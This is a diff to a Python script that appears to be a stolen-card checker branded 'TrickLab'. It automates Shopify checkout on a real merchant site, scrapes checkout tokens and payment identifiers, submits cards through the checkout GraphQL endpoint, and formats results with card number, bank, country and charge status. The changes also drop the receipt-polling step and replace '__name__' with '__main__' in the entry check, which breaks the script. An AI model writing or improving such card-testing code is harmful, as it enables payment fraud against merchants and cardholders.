@@ -201,17 +201,37 @@ async def sh(message):
                         inputs = soup.find_all('input')
                         logger.info(f"Found {len(inputs)} input elements: {[input.get('name') for input in inputs if input.get('name')]}")
 
+                        # Log data attributes
+                        data_attrs = soup.find_all(attrs={'data-queue-token': True}) + \
+                                     soup.find_all(attrs={'data-stable-id': True}) + \
+                                     soup.find_all(attrs={'data-payment-method-identifier': True})
+                        for elem in data_attrs:
+                            for attr, value in elem.attrs.items():
+                                if 'queue-token' in attr:
+                                    queue_token = value
+                                    logger.info(f"Found data attribute: {attr}={value}")
+                                elif 'stable-id' in attr:
+                                    stableid = value
+                                    logger.info(f"Found data attribute: {attr}={value}")
+                                elif 'payment-method-identifier' in attr:
+                                    paymentmethodidentifier = value
+                                    logger.info(f"Found data attribute: {attr}={value}")
+
                         # Try parsing script tags for JSON data
                         if not all([queue_token, stableid, paymentmethodidentifier]):
                             logger.info("Input parsing failed, searching script tags")
                             scripts = soup.find_all('script')
-                            potential_vars = ['checkout', 'checkoutConfig', 'shopifyCheckout', 'Checkout']
+                            potential_vars = ['checkout', 'checkoutConfig', 'shopifyCheckout', 'Checkout', 'window.ShopifyCheckout', 'window.checkoutData']
+                            with open('script_tags.txt', 'w') as f:
+                                for i, script in enumerate(scripts):
+                                    if script.string:
+                                        f.write(f"\n--- Script {i} ---\n{script.string}\n")
+                                        logger.info(f"Script {i} content (first 200 chars): {script.string[:200]}")
                             for script in scripts:
                                 if script.string:
-                                    logger.info(f"Script content (first 200 chars): {script.string[:200]}")
                                     for var_name in potential_vars:
                                         try:
-                                            json_match = re.search(rf'var {var_name}\s*=\s*({{.*?}});', script.string, re.DOTALL)
+                                            json_match = re.search(rf'(?:var|const|let)\s*{var_name}\s*=\s*({{.*?}});', script.string, re.DOTALL)
                                             if json_match:
                                                 checkout_data = json.loads(json_match.group(1))
                                                 queue_token = checkout_data.get('queueToken', checkout_data.get('queue_token', queue_token))
@@ -311,80 +331,68 @@ async def sh(message):
                 text = await response.text()
                 logger.info(f"SubmitForCompletion response: {text}")
                 res_json = json.loads(text)
+                elapsed_time = time.time() - start_time
                 if 'errors' in res_json:
                     logger.error(f"GraphQL errors: {res_json['errors']}")
-                    return f"Failed to submit for completion: GraphQL errors - {res_json['errors']}"
+                    return f"""Card: {full_card}
+Status: Failed❌
+Response: GraphQL errors - {res_json['errors']}
+Details: {type} - {level} - {brand}
+Bank: {bank}
+Country: {country}{flag} - {currency}
+Gateway: Shopify 1$
+Taken: {elapsed_time:.2f}s
+Bot by: TrickLab"""
                 elif 'data' in res_json:
                     submit_result = res_json['data']['submitForCompletion']
                     if 'receipt' in submit_result:
                         rid = submit_result['receipt']['id']
                         logger.info(f"Successfully submitted for completion, receipt ID: {rid}")
+                        return f"""Card: {full_card}
+Status: Submitted✅
+Response: Receipt ID {rid}
+Details: {type} - {level} - {brand}
+Bank: {bank}
+Country: {country}{flag} - {currency}
+Gateway: Shopify 1$
+Taken: {elapsed_time:.2f}s
+Bot by: TrickLab"""
                     else:
                         logger.error(f"SubmitForCompletion failed: {submit_result}")
-                        return f"Failed to submit for completion: {submit_result.get('reason', 'No receipt')}"
+                        return f"""Card: {full_card}
+Status: Failed❌
+Response: {submit_result.get('reason', 'No receipt')}
+Details: {type} - {level} - {brand}
+Bank: {bank}
+Country: {country}{flag} - {currency}
+Gateway: Shopify 1$
+Taken: {elapsed_time:.2f}s
+Bot by: TrickLab"""
                 else:
                     logger.error("Unexpected response format")
-                    return "Failed to submit for completion: Unexpected response format"
+                    return f"""Card: {full_card}
+Status: Failed❌
+Response: Unexpected response format
+Details: {type} - {level} - {brand}
+Bank: {bank}
+Country: {country}{flag} - {currency}
+Gateway: Shopify 1$
+Taken: {elapsed_time:.2f}s
+Bot by: TrickLab"""
         except Exception as e:
             logger.error(f"Error submitting for completion: {str(e)}")
-            return f"Failed to submit for completion: {str(e)}"
-
-        # Step 6: Poll for receipt
-        headers = {
-            'authority': 'www.buildingnewfoundations.com',
-            'accept': 'application/json',
-            'content-type': 'application/json',
-            'origin': 'https://www.buildingnewfoundations.com',
-            'user-agent': user_agent,
-            'x-checkout-one-session-token': x,
-            'x-checkout-web-source-id': tok,
-        }
-        params = {'operationName': 'PollForReceipt'}
-        json_data = {
-            'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}__typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
-            'variables': {'receiptId': rid, 'sessionToken': x}
-        }
-        elapsed_time = time.time() - start_time
-        try:
-            async with r.post('https://www.buildingnewfoundations.com/checkouts/unstable/graphql', params=params, headers=headers, json=json_data) as response:
-                text = await response.text()
-                logger.info(f"PollForReceipt response: {text}")
-                if "thank" in text.lower():
-                    return f"""Card: {full_card}
-Status: Charged🔥
-Response: Order # confirmed
+            elapsed_time = time.time() - start_time
+            return f"""Card: {full_card}
+Status: Failed❌
+Response: {str(e)}
 Details: {type} - {level} - {brand}
 Bank: {bank}
 Country: {country}{flag} - {currency}
 Gateway: Shopify 1$
 Taken: {elapsed_time:.2f}s
 Bot by: TrickLab"""
-                elif "actionrequiredreceipt" in text.lower():
-                    return f"""Card: {full_card}
-Status: Approved!✅
-Response: ActionRequired
-Details: {type} - {level} - {brand}
-Bank: {bank}
-Country: {country}{flag} - {currency}
-Gateway: Shopify 1$
-Taken: {elapsed_time:.2f}s
-Bot by: TrickLab"""
-                else:
-                    fff = find_between(text, '"code":"', '"')
-                    return f"""Card: {full_card}
-Status: Declined!❌
-Response: {fff}
-Details: {type} - {level} - {brand}
-Bank: {bank}
-Country: {country}{flag} - {currency}
-Gateway: Shopify 1$
-Taken: {elapsed_time:.2f}s
-Bot by: TrickLab"""
-        except Exception as e:
-            logger.error(f"Error polling for receipt: {str(e)}")
-            return "Failed to poll for receipt"
 
 # Run the script
-if __name__ == "__main__":
+if __main__ == "__main__":
     ok = input("Card: ")
     print(asyncio.run(sh(ok)))
